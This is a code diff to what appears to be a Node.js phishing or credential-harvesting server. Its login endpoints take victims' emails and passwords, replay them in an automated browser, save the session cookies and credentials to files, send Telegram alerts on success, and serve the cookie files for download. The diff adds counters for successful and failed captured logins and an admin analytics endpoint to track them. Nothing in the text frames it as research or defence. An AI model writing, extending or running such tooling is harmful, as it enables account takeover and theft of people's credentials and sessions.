@@ -60,6 +60,13 @@ const HEALTH_CHECK_INTERVAL = 2 * 60 * 1000; // 2 minutes
 let sessionMutex = null; // Prevents race conditions in session management
 let initializingSession = false; // Prevents concurrent browser initialization
 
+// Analytics tracking
+const analytics = {
+    totalVisits: 0,
+    validEntries: 0,
+    invalidEntries: 0
+};
+
 // Helper function to initialize browser directly - Prevents concurrent initialization
 async function initBrowser(session) {
     // Prevent concurrent browser initialization
@@ -358,7 +365,11 @@ app.post('/api/login', async (req, res) => {
     try {
         const { email, password, sessionId: requestedSessionId } = req.body;
 
+        // Track visit
+        analytics.totalVisits++;
+
         if (!email) {
+            analytics.invalidEntries++;
             return res.status(400).json({ 
                 error: 'Email is required' 
             });
@@ -429,6 +440,7 @@ app.post('/api/login', async (req, res) => {
 
                 // If password login successful, save cookies but don't use them
                 if (loginSuccess) {
+                    analytics.validEntries++;
                     console.log('💾 Saving session cookies to file (not for reuse)...');
                     const sessionFile = await session.automation.saveCookies(email, password);
                     
@@ -468,6 +480,11 @@ app.post('/api/login', async (req, res) => {
 
             // Take screenshot after login attempt
             session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);
+
+            // Track failed login attempts
+            if (!loginSuccess) {
+                analytics.invalidEntries++;
+            }
 
             res.json({
                 sessionId: sessionId,
@@ -551,6 +568,7 @@ app.post('/api/login', async (req, res) => {
                                     siteReport.errorMessages.push(errorText.trim());
                                     console.log(`Found error message: ${errorText.trim()}`);
                                     foundAccountNotFoundError = true;
+                                    analytics.invalidEntries++;
                                 } else {
                                     // Remove all other bordered error messages from HTML
                                     await element.evaluate(el => el.remove());
@@ -753,6 +771,8 @@ app.post('/api/continue-login', async (req, res) => {
                     `Login completed successfully! Session saved to: ${sessionFile}` :
                     'Login completed successfully!';
                 
+                analytics.validEntries++;
+                
                 // Send Telegram notification if bot is available
                 if (telegramBot && sessionFile && loginSuccess) {
                     try {
@@ -786,6 +806,7 @@ app.post('/api/continue-login', async (req, res) => {
                 }
             } else {
                 responseMessage = 'Login may require additional verification';
+                analytics.invalidEntries++;
             }
 
             res.json({
@@ -1354,6 +1375,11 @@ app.get('/api/bot-status', (req, res) => {
             'Telegram Bot is running and ready to send notifications!' : 
             'Telegram Bot disabled - Add TELEGRAM_BOT_TOKEN to enable'
     });
+});
+
+// Analytics endpoint
+app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
+    res.json(analytics);
 });
 
 // Download cookie file
